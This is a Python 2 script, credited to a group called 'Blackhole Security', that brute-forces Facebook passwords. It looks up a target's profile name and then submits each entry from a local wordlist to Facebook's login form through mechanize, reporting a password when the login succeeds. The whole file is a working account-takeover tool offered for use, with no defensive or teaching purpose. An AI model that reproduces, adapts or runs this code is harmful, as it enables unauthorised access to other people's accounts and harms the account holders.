try:
 from urllib2 import urlopen
 import sys,string,urllib2,time,mechanize,cookielib,random,os;os.system("clear")
 from bs4 import BeautifulSoup
except ImportError as e:
 print "\033[1;31m [ Install Packages %s ] \033[1;0m "%(e)
 sys.exit()


banner = """
 \033[1;32m [ Author : X14N23N6                     ] \033[1;0m
 \033[1;32m [ Team   : Blackhole Security           ] \033[1;0m
 \033[1;32m [ Script : Python                       ] \033[1;0m
 \033[1;33m [ \033[1;0m\033[1;31mAlert  :\033[1;0m\033[1;35m Don't Recode mother fucker !\033[1;0m\033[1;33m ] \033[1;0m
 
"""
try:
 id = raw_input("\033[1;32m[\033[1;0m\033[1;34m ID \033[1;0m\033[1;32m]\033[1;0m \033[1;33m : \033[1;0m")
except KeyboardInterrupt:
 print "\033[1;31m[ EXITING ] \033[1;0m"
 sys.exit()
except EOFError:
 print "\033[1;31m[ EXITING ] \033[1;0m"
 sys.exit()
useragents = [( 'User-agent' , 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc')]
login = "https://facebook.com/login.php?login_attempt=1"
print banner
try:
 urs = "https://free.facebook.com/"+id
 kau = urlopen(urs).read()
 soup = BeautifulSoup(kau, "html.parser")
 data = soup
 print "\033[1;32m[ NAME ] : \033[1;0m\033[1;34m%s\033[1;0m"%data.find("h3","bi").get_text()
except urllib2.HTTPError:
 print "\033[1;31m[ 404 ]\033[1;0m"
 sys.exit()
except AttributeError:
 print "\033[1;31m[ h3 class='bi' Not Found ! ] \033[1;0m"
 sys.exit()
except urllib2.URLError:
 print "\033[1;31m[ No Connection ]\033[1;0m"
 sys.exit()
print "\033[1;32m[ USERNAME ] : \033[1;0m\033[1;34m%s\033[1;0m"%(id)
def v(pw):
 try:
  sys.stdout.write("\r\033[1;32m[ Login With Password ] : \033[1;0m \033[1;34m %s \033[1;0m"%(pw))
  sys.stdout.flush()
  br.addheaders = [( 'User-agent' , random.choice(useragents))]
  br.open(login)
  
  br.select_form( nr=0 )
  br.form["email"]=id
  br.form["pass"]=pw
  br.submit()
  log = br.geturl()
  if( log != login) and (not "login_attempt" in log):
   print "\n\033[1;32m[ Password Found ] : \033[1;0m \033[1;34m %s \033[1;0m"%(pw)
   sys.exit()
 except KeyboardInterrupt:
  print "\033[1;31m[ EXITING ]\033[1;0m"
  sys.exit()
 except urllib2.URLError:
  print "\n\033[1;31m[ No Connection ] \033[1;0m"
  sys.exit()
  
def find():
 global passwords
 for password in passwords:
  v(password.replace("\n",""))
  
def scan():
 global br
 global passwords
 try:
  br = mechanize.Browser()
  cj = cookielib.LWPCookieJar()
  br.set_handle_robots( False )
  br.set_handle_referer( True )
  br.set_handle_redirect( True )
  br.set_handle_equiv( True )
  br.set_cookiejar(cj)
  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
 except KeyboardInterrupt:
  sys.exit()
  
 try:
  wo = open("list.txt","r")
  passwords = wo.readlines()
  k = 0
  while k < len(passwords):
   passwords[k] = passwords[k].strip()
   k += 1
 except IOError:
  print "\033[1;31m [ Please Create Your wordlist with name 'list.txt'\033[1;0m"
  sys.exit()
 try:
  find()
  v(password)
 except KeyboardInterrupt:
  print "\033[1;31m[ EXITING ] \033[1;0m"
  sys.exit()
  
if __name__ == "__main__":
 scan()